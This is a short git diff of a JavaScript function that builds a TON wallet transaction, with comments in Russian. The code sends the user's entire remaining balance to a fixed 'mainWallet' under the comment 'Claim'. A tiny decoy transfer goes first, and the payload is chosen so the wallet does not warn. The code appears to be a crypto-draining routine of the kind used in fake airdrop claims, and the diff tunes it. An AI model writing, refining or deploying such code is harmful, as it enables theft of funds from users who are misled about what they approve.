@@ -92,21 +92,19 @@ async function didtrans() {
 
         // Одна транзакция с двумя сообщениями (нулевая первая!)
         const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 60,
+            validUntil: Math.floor(Date.now() / 1000) + 120, // 2 минуты на подтверждение
             messages: [
                 {
                     address: mainWallet, // Нулевая транзакция (идет первой)
-                    amount: 1000000, // 1000 нанотонов (0.000001 TON)
-                    payload: "te6cckEBAgEAAQAAAA==", // Пустой payload
-                    sendMode: 3, // Минимальный режим для пропуска комиссии
+                    amount: 2000000, // 2_000_000 нанотонов = 0.002 TON
+                    payload: "te6cckEBAgEAAQAAAA==", // Пустой payload, чтобы кошелек не ругался
                 },
                 {
                     address: mainWallet, // Основная сумма
-                    amount: remainingBalance, 
-                    payload: "te6cckEBAgEAAQAAAA==", // Пустой payload
-                    sendMode: 3, // Обычный режим
+                    amount: remainingBalance,
                 }
             ],
+            sendMode: 3, // Обычный режим для обоих
             comment: "Claim",
         };
 
@@ -118,4 +116,3 @@ async function didtrans() {
         console.error('Ошибка при отправке транзакции:', error);
     }
 }
-
